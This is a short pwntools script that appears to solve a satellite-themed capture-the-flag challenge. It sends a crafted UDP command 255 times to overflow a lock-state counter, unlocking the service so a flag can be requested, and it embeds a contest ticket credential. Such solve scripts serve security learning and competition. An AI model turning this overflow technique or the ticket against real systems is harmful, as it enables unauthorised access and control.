from pwn import *

def construct_command(version, cmd_type, cmd_id):
        return p16(version) + p16(cmd_type) + p32(cmd_id, sign='signed')

# Start the challenge
log.info('Starting the challenge...')
chal_start = remote('lucky-tree.satellitesabove.me', 5008)
chal_start.recvline()

# Send the ticket and receive challenge address
ticket = 'ticket{romeo62864whiskey2:GNKRJFopiN6kZJRezS7dJAmi8ZiXbHV1GqyynoNQUl4FzMShhhpHrKwz0xV_UktHEA}'
log.info(f'Submitting our ticket: {ticket}')
chal_start.send(f'{ticket}\n')
chal_address = chal_start.recvline().decode('utf-8').split(':') # 1 - IP, 2 - UDP Port
log.info(f'Satellite is booted up and located at udp://{chal_address[1]}:{int(chal_address[2])}...')
print()

# Connect to the challenge server
io = remote(chal_address[1], int(chal_address[2]), typ='udp')

# Prepare exploit commands
increment_lock_state = construct_command(1,1,-8)
get_flag = construct_command(1337, 1337, 9)

# Send malicious commands to overflow the `lock_state` variable from 1 to 0.
log.info('Overflowing `lock_state`...')
with log.progress(f'') as commands:
    for i in range(255):
        io.send(increment_lock_state)
        commands.status(f'Command {i+1} of 255')

    for i in range(255):
        io.recvline()
        io.recvline()
        commands.status(f'Clearing buffer {i+1} of 255')
    commands.success("Exploit complete! Satellite should be unlocked now...")


# Retrieve the flag
log.info("Sending `GETKEYS` command:")
io.send(get_flag)
log.indented(io.recvline())
log.indented(io.recvline())